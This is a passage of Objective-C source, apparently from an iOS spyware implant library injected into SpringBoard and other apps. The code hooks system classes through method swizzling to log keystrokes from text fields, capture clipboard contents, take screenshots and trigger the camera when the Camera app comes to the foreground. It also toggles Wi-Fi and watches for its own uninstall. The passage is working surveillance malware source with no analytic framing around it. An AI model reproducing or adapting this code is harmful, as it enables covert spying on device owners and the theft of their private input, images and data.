          Class classSource = objc_getClass("myUINavigationItem");

          gLogger = [[RCSIKeyLogger alloc] init];

          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(setTitle:),
                                  class_getMethodImplementation(classSource, @selector(setTitleHook:)),
                                  @selector(setTitleHook:));
            }
          else
            {
#ifdef DEBUG_TMP
              NSLog(@"Not the right application, skipping");
#endif
            }

          [[NSNotificationCenter defaultCenter] addObserver: gLogger
                                                   selector: @selector(keyPressed:)
                                                       name: UITextFieldTextDidChangeNotification
                                                     object: nil];
          [[NSNotificationCenter defaultCenter] addObserver: gLogger
                                                   selector: @selector(keyPressed:)
                                                       name: UITextViewTextDidChangeNotification
                                                     object: nil];
        }
      else if (keyboardFlag == 3)
        {
          keyboardFlag = 0;

#ifdef DEBUG_TMP
          NSLog(@"Unhooking Keystrokes");
#endif

          Class className = objc_getClass("UINavigationItem");

          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(setTitle:),
                                  class_getMethodImplementation(className, @selector(setTitleHook:)),
                                  @selector(setTitleHook:));
            }
          else
            {
#ifdef DEBUG_TMP
              NSLog(@"Not the right application, skipping");
#endif
            }

          [[NSNotificationCenter defaultCenter] removeObserver: gLogger
                                                          name: UITextFieldTextDidChangeNotification
                                                        object: nil];
          [[NSNotificationCenter defaultCenter] removeObserver: gLogger
                                                          name: UITextViewTextDidChangeNotification
                                                        object: nil];
          [gLogger release];
        }

      if (clipboardFlag == 1)
        {
          clipboardFlag = 2;

#ifdef DEBUG
          NSLog(@"Hooking pasteboard");
#endif

          Class className   = objc_getClass("UIPasteboard");
          Class classSource = objc_getClass("myUIPasteboard");

          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(addItems:),
                                  class_getMethodImplementation(classSource, @selector(addItemsHook:)),
                                  @selector(addItemsHook:));
            }
          else
            {
#ifdef DEBUG
              NSLog(@"Not the right application, skipping");
#endif
            }
        }
      else if (clipboardFlag == 3)
        {
          clipboardFlag = 0;

#ifdef DEBUG
          NSLog(@"Unhooking pasteboard");
#endif

          Class className = objc_getClass("UIPasteboard");

          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(addItems:),
                                  class_getMethodImplementation(className, @selector(addItemsHook:)),
                                  @selector(addItemsHook:));
            }
          else
            {
#ifdef DEBUG
              NSLog(@"Not the right application, skipping");
#endif
            }
        }

      [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
 
      [innerPool release];
    }
  
  [pool release];
  
  return;
}

- (void)startCoreCommunicator
{
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: execName %@", __FUNCTION__, execName);
#endif
  
  if ([execName compare: SPRINGBOARD] == NSOrderedSame)
    {
      [NSThread detachNewThreadSelector: @selector(checkForUninstall)
        toTarget: self
        withObject: nil];

      // Install a callback in order to be able to force wifi on and off
      // before/after syncing
      CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),
                                      NULL,
                                      &TurnWifiOn,
                                      CFSTR("com.apple.Preferences.WiFiOn"),
                                      NULL, 
                                      CFNotificationSuspensionBehaviorCoalesce); 

      CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),
                                      NULL,
                                      &TurnWifiOff,
                                      CFSTR("com.apple.Preferences.WiFiOff"),
                                      NULL, 
                                      CFNotificationSuspensionBehaviorCoalesce); 
    }
  else
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: not SB don't hooking", __FUNCTION__);
#endif      
      [NSThread detachNewThreadSelector: @selector(communicateWithCore)
                               toTarget: self
                             withObject: nil];
    }
}

- (void)stopCoreCommunicator
{

}

#define APP_IN_BACKGROUND 0
#define APP_IN_FOREGROUND 1

- (void)appInForeground
{
  if (gContextHasBeenSwitched == APP_IN_BACKGROUND)
    {
      gContextHasBeenSwitched = APP_IN_FOREGROUND;
      [gLogger setMContextHasBeenSwitched: TRUE];
    }
  
  RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
  [scrAgent setMContextHasBeenSwitched:APP_IN_FOREGROUND];
  
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  if ([execName compare: CAMERA_APP]    == NSOrderedSame ||
      [execName compare: CAMERA_APP_40] == NSOrderedSame)
    {
      triggerCamera(1);
    }
}

- (void)appInBackground
{
  if (gContextHasBeenSwitched == APP_IN_FOREGROUND)
    gContextHasBeenSwitched = APP_IN_BACKGROUND;
    
  RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
  [scrAgent setMContextHasBeenSwitched:APP_IN_BACKGROUND];
  
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  if ([execName compare: CAMERA_APP] == NSOrderedSame ||
      [execName compare: CAMERA_APP_40] == NSOrderedSame)
    {
      triggerCamera(2);
    }
}

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      mMainThreadRunning = YES;
    }
  return self;
}

@end

extern "C" void RCSIInit ()
{
  NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
  
  NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];

  RCSILoader *loader = [[RCSILoader alloc] init];
  
#ifdef CORE_DEMO
  if ([bundleIdentifier compare: SPRINGBOARD] == NSOrderedSame)
    {
      AudioServicesPlaySystemSound(1304);
      [loader hookingForCoreDemo];
    }
#endif
  
  [[NSNotificationCenter defaultCenter] addObserver: loader
                                           selector: @selector(startCoreCommunicator)
                                               name: UIApplicationDidFinishLaunchingNotification
                                             object: nil];

   NSInteger OSMajor = [[[UIDevice currentDevice] systemVersion] integerValue];

   if (OSMajor >= 4)
     {
      [[NSNotificationCenter defaultCenter] addObserver: loader
                                               selector: @selector(appInForeground)
                                                   name: @"UIApplicationWillEnterForegroundNotification"
                                                 object: nil];
                                                 
      [[NSNotificationCenter defaultCenter] addObserver: loader
                                               selector: @selector(appInBackground)
                                                   name: @"UIApplicationDidEnterBackgroundNotification"
                                                 object: nil];
      // only for 4.0
      [[NSNotificationCenter defaultCenter] addObserver: loader
                                               selector: @selector(appInBackground)
                                                   name: @"UIApplicationWillTerminateNotification"
                                                 object: nil];
     }
     
  [pool drain];
}
